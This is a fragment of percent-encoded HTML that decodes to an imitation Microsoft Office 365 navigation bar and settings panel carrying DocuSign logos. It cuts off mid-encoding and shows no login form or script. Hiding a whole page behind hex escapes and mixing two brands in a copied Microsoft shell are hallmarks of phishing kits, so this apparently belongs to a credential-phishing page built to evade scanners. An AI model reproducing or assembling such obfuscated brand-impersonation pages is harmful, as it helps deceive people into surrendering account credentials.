%5F%4C%6F%67%6F%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%62%70%6F%73%4C%6F%67%6F%20%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%54%65%78%74%20%6F%33%36%35%63%73%2D%6F%33%36%35%6C%6F%67%6F%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%77%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%20%6F%33%36%35%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%62%72%61%6E%64%69%6E%67%54%65%78%74%22%3E%3C%69%6D%67%20%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%69%6D%61%67%65%73%2F%64%6F%63%75%73%69%67%6E%2E%70%6E%67%22%20%74%69%74%6C%65%3D%22%64%6F%63%75%73%69%67%6E%22%20%61%75%74%6F%69%64%3D%22%5F%6F%33%36%35%73%67%32%63%5F%30%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%77%69%64%74%68%3D%22%31%36%32%22%20%68%65%69%67%68%74%3D%22%33%30%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%69%74%65%6D%20%6F%33%36%35%63%73%2D%6E%61%76%2D%62%75%74%74%6F%6E%20%6D%73%2D%66%63%6C%2D%77%20%6F%33%36%35%63%73%2D%6D%65%2D%6E%61%76%2D%69%74%65%6D%20%6F%33%36%35%62%75%74%74%6F%6E%20%6D%73%2D%62%67%63%2D%74%64%72%2D%68%22%3E%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%67%61%6C%6C%61%74%69%6E%4C%6F%67%6F%20%6F%77%61%69%6D%67%22%3E%20%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%61%70%70%54%69%74%6C%65%4C%69%6E%65%20%6F%33%36%35%63%73%2D%6E%61%76%2D%62%72%61%6E%64%69%6E%67%54%65%78%74%20%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%54%65%78%74%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%77%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%22%3E%3C%2F%64%69%76%3E%3C%61%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%33%20%41%70%70%73%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%61%70%70%54%69%74%6C%65%20%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%54%65%78%74%20%6F%33%36%35%62%75%74%74%6F%6E%20%6F%33%36%35%63%73%2D%64%69%73%70%6C%61%79%2D%6E%6F%6E%65%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%62%72%61%6E%64%69%6E%67%54%65%78%74%22%3E%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%61%70%70%54%69%74%6C%65%20%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%54%65%78%74%22%3E%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%62%72%61%6E%64%69%6E%67%54%65%78%74%22%3E%3C%2F%73%70%61%6E%3E%20%3C%2F%73%70%61%6E%3E%3C%2F%64%69%76%3E%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%62%72%65%61%64%43%72%75%6D%62%43%6F%6E%74%61%69%6E%65%72%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%77%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%22%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%63%65%6E%74%65%72%41%6C%69%67%6E%22%3E%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%72%73%70%2D%74%77%2D%73%6D%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%22%3E%3C%2F%64%69%76%3E%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%72%73%70%2D%74%77%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%22%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%69%64%3D%22%4F%33%36%35%5F%54%6F%70%4D%65%6E%75%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%72%69%67%68%74%41%6C%69%67%6E%20%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%4C%69%6E%6B%42%61%63%6B%67%72%6F%75%6E%64%2D%32%22%3E%20%3C%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%72%69%67%68%74%4D%65%6E%75%73%22%3E%20%3C%64%69%76%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%55%73%65%72%20%73%65%74%74%69%6E%67%73%22%20%72%6F%6C%65%3D%22%62%61%6E%6E%65%72%22%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%22%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%70%69%6E%54%6F%54%6F%70%22%3E%3C%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%22%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%6D%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%77%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%6E%22%3E%3C%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%6D%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%64%69%76%3E%3C%62%75%74%74%6F%6E%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%4F%70%65%6E%20%74%68%65%20%61%70%70%20%6C%61%75%6E%63%68%65%72%20%74%6F%20%61%63%63%65%73%73%20%79%6F%75%72%20%4F%66%66%69%63%65%20%33%36%35%20%61%70%70%73%22%20%61%72%69%61%2D%64%69%73%61%62%6C%65%64%3D%22%66%61%6C%73%65%22%20%69%64%3D%22%4F%33%36%35%5F%4D%61%69%6E%4C%69%6E%6B%5F%4E%61%76%4D%65%6E%75%5F%52%65%73%70%6F%6E%73%69%76%65%22%20%72%6F%6C%65%3D%22%6D%65%6E%75%69%74%65%6D%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%69%74%65%6D%20%6F%33%36%35%63%73%2D%6E%61%76%2D%62%75%74%74%6F%6E%20%6D%73%2D%62%67%63%2D%74%64%72%2D%68%20%6F%33%36%35%62%75%74%74%6F%6E%20%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%54%65%78%74%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%54%65%78%74%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%77%61%66%66%6C%65%32%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%32%30%22%3E%20%3C%2F%73%70%61%6E%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%50%61%6E%65%2D%75%6E%73%65%65%6E%69%74%65%6D%73%22%3E%20%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%50%61%6E%65%2D%75%6E%73%65%65%6E%43%6F%75%6E%74%20%6D%73%2D%66%63%6C%2D%77%20%6D%73%2D%62%67%63%2D%74%64%72%22%3E%3C%2F%73%70%61%6E%3E%20%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%50%61%6E%65%2D%75%6E%73%65%65%6E%43%6F%75%6E%74%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%73%74%61%72%62%75%72%73%74%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%31%32%20%6D%73%2D%66%63%6C%2D%77%20%6D%73%2D%62%67%63%2D%74%64%72%22%3E%20%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%6E%22%3E%3C%69%6D%67%20%73%72%63%3D%22%69%6D%61%67%65%73%2F%61%70%70%6C%65%2D%74%6F%75%63%68%2D%69%63%6F%6E%2D%37%32%78%37%32%2E%70%6E%67%22%20%74%69%74%6C%65%3D%22%64%6F%63%75%73%69%67%6E%22%20%61%75%74%6F%69%64%3D%22%5F%6F%33%36%35%73%67%32%63%5F%30%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%69%74%65%6D%20%6F%33%36%35%63%73%2D%6E%61%76%2D%62%75%74%74%6F%6E%20%6D%73%2D%66%63%6C%2D%77%20%6F%33%36%35%63%73%2D%6D%65%2D%6E%61%76%2D%69%74%65%6D%20%6F%33%36%35%62%75%74%74%6F%6E%20%6D%73%2D%62%67%63%2D%74%64%72%2D%68%22%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6D%65%2D%74%69%6C%65%76%69%65%77%2D%63%6F%6E%74%61%69%6E%65%72%22%3E%3C%64%69%76%20%61%75%74%6F%69%64%3D%22%5F%6F%33%36%35%73%67%32%63%5F%31%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6D%65%2D%74%69%6C%65%76%69%65%77%22%3E%3C%64%69%76%20%61%75%74%6F%69%64%3D%22%5F%6F%33%36%35%73%67%32%63%5F%32%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6D%65%2D%70%72%65%73%65%6E%63%65%35%78%35%30%20%6F%33%36%35%63%73%2D%6D%65%2D%70%72%65%73%65%6E%63%65%43%6F%6C%6F%72%2D%4F%66%66%6C%69%6E%65%22%3E%3C%2F%64%69%76%3E%3C%73%70%61%6E%20%61%75%74%6F%69%64%3D%22%5F%6F%33%36%35%73%67%32%63%5F%33%22%20%63%6C%61%73%73%3D%22%6D%73%2D%62%67%63%2D%6E%74%20%6D%73%2D%66%63%6C%2D%77%20%6F%33%36%35%63%73%2D%6D%65%2D%74%69%6C%65%69%6D%67%20%6F%33%36%35%63%73%2D%6D%65%2D%74%69%6C%65%69%6D%67%2D%64%6F%75%67%68%62%6F%79%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%70%65%72%73%6F%6E%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%35%32%22%3E%20%3C%2F%73%70%61%6E%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6D%65%2D%74%69%6C%65%69%6D%67%22%3E%3C%69%6D%67%20%73%72%63%3D%22%69%6D%61%67%65%73%2F%61%70%70%6C%65%2D%74%6F%75%63%68%2D%69%63%6F%6E%2D%37%32%78%37%32%2E%70%6E%67%22%20%74%69%74%6C%65%3D%22%64%6F%63%75%73%69%67%6E%22%20%73%74%79%6C%65%3D%22%22%20%61%75%74%6F%69%64%3D%22%74%65%78%74%22%20%63%6C%61%73%73%3D%22%74%65%78%74%22%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%77%31%30%30%2D%68%31%30%30%22%3E%3C%64%69%76%3E%20%3C%64%69%76%20%69%73%70%6F%70%75%70%3D%22%31%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%6F%74%69%66%69%63%61%74%69%6F%6E%73%2D%6E%6F%74%69%66%69%63%61%74%69%6F%6E%50%6F%70%75%70%41%72%65%61%20%6F%33%36%35%63%73%20%6F%33%36%35%63%73%2D%62%61%73%65%20%6F%33%36%35%63%73%74%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%69%64%3D%22%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%50%61%6E%65%6C%2D%6F%76%65%72%6C%61%79%22%20%74%61%62%69%6E%64%65%78%3D%22%2D%31%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%50%61%6E%65%6C%2D%6F%76%65%72%6C%61%79%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%69%64%3D%22%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%50%61%6E%65%6C%2D%77%72%61%70%70%65%72%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%50%61%6E%65%6C%2D%77%72%61%70%70%65%72%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%69%64%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%6F%76%65%72%6C%61%79%22%3E%3C%62%75%74%74%6F%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%74%61%62%69%6E%64%65%78%3D%22%2D%31%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%50%61%6E%65%2D%6F%76%65%72%6C%61%79%62%75%74%74%6F%6E%20%6F%33%36%35%63%73%2D%66%6C%65%78%50%61%6E%65%2D%6F%76%65%72%6C%61%79%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%2F%62%75%74%74%6F%6E%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%50%61%6E%65%2D%70%61%6E%65%6C%20%6F%33%36%35%63%73%2D%66%6C%65%78%50%61%6E%65%2D%6F%76%65%72%6C%61%79%20%6D%73%2D%62%63%6C%2D%6E%74%61%20%6D%73%2D%62%67%63%2D%6E%6C%72%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%20%68%65%69%67%68%74%3A%20%36%34%31%70%78%3B%20%6D%61%78%2D%68%65%69%67%68%74%3A%20%36%34%31%70%78%3B%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%69%64%3D%22%4F%33%36%35%66%70%63%6F%6E%74%61%69%6E%65%72%69%64%22%3E%20%3C%62%75%74%74%6F%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%43%6C%6F%73%65%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%50%61%6E%65%2D%63%6C%6F%73%65%62%75%74%74%6F%6E%20%6D%73%2D%66%63%6C%2D%6E%70%20%6D%73%2D%62%67%63%2D%77%2D%68%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%2F%62%75%74%74%6F%6E%3E%20%20%3C%64%69%76%20%72%6F%6C%65%3D%22%72%65%67%69%6F%6E%22%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%2D%73%65%63%74%69%6F%6E%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%2D%74%69%74%6C%65%20%6F%33%36%35%63%73%2D%6C%69%67%68%74%46%6F%6E%74%20%6D%73%2D%66%63%6C%2D%6E%70%20%77%66%2D%73%69%7A%65%2D%78%32%38%22%3E%20%3C%73%70%61%6E%3E%53%65%74%74%69%6E%67%73%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%2D%73%65%61%72%63%68%62%6F%78%22%3E%20%3C%64%69%76%20%69%64%3D%22%4F%33%36%35%5F%46%6C%65%78%50%61%6E%65%5F%53%65%74%74%69%6E%67%73%5F%53%65%61%72%63%68%5F%43%6F%6E%74%72%6F%6C%22%20%72%6F%6C%65%3D%22%74%65%78%74%62%6F%78%22%20%63%6C%61%73%73%3D%22%61%6C%6C%6F%77%54%65%78%74%53%65%6C%65%63%74%69%6F%6E%20%6D%73%2D%66%63%6C%2D%6E%73%20%74%65%78%74%62%6F%78%20%6D%73%2D%66%6F%6E%74%2D%73%20%6D%73%2D%66%77%74%2D%73%6C%20%6D%73%2D%66%63%6C%2D%6E%70%20%6D%73%2D%62%63%6C%2D%6E%74%61%20%6D%73%2D%62%63%6C%2D%6E%73%61%2D%68%20%6F%33%36%35%2D%73%65%61%72%63%68%2D%63%6F%6E%74%72%6F%6C%22%3E%3C%62%75%74%74%6F%6E%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%41%63%74%69%76%61%74%65%20%53%65%61%72%63%68%20%54%65%78%74%62%6F%78%22%20%69%64%3D%22%4F%33%36%35%5F%53%65%61%72%63%68%5F%42%75%74%74%6F%6E%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%73%65%61%72%63%68%2D%62%6F%78%20%6F%33%36%35%62%75%74%74%6F%6E%20%6D%73%2D%62%67%63%2D%74%6C%72%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%73%65%61%72%63%68%2D%69%63%6F%6E%20%6F%33%36%35%2D%73%65%61%72%63%68%2D%69%63%6F%6E%2D%72%69%67%68%74%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%73%65%61%72%63%68%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%31%37%20%6D%73%2D%66%63%6C%2D%74%70%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%73%65%61%72%63%68%2D%70%6C%61%63%65%68%6F%6C%64%65%72%20%6F%33%36%35%63%73%2D%73%65%6D%69%4C%69%67%68%74%46%6F%6E%74%20%6D%73%2D%66%63%6C%2D%6E%73%22%3E%53%65%61%72%63%68%20%61%6C%6C%20%73%65%74%74%69%6E%67%73%3C%2F%73%70%61%6E%3E%3C%2F%62%75%74%74%6F%6E%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%73%65%61%72%63%68%2D%62%6F%78%20%6D%73%2D%62%67%63%2D%74%6C%72%22%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%20%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%76%69%65%77%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%63%73%2D%63%61%72%64%73%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6E%74%61%69%6E%65%72%20%6D%73%2D%62%63%6C%2D%6E%6C%22%3E%20%3C%64%69%76%3E%20%3C%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%61%75%74%6F%69%64%3D%22%5F%5F%4D%69%63%72%6F%73%6F%66%74%5F%4F%33%36%35%5F%53%68%65%6C%6C%47%32%5F%50%6C%75%73%5F%74%65%6D%70%6C%61%74%65%73%5F%63%73%5F%76%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%63%61%72%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6C%6C%61%70%73%65%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%6C%6F%61%64%69%6E%67%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%73%70%69%6E%6E%65%72%22%3E%3C%2F%64%69%76%3E%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%77%66%2D%73%69%7A%65%2D%78%31%34%22%3E%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%63%61%72%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6C%6C%61%70%73%65%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%6C%6F%61%64%69%6E%67%22%3E%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%77%66%2D%73%69%7A%65%2D%78%31%34%22%3E%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%20%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%63%61%72%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6C%6C%61%70%73%65%64%20%77%66%2D%73%69%7A%65%2D%78%31%34%20%6D%73%2D%62%63%6C%2D%6E%6C%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%6E%6F%72%65%73%75%6C%74%73%2D%73%70%61%63%69%6E%67%22%3E%3C%73%70%61%6E%3E%3C%2F%73%70%61%6E%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%3E%3C%73%70%61%6E%3E%54%72%79%20%72%65%70%68%72%61%73%69%6E%67%20%79%6F%75%72%20%71%75%65%72%79%2E%3C%2F%73%70%61%6E%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20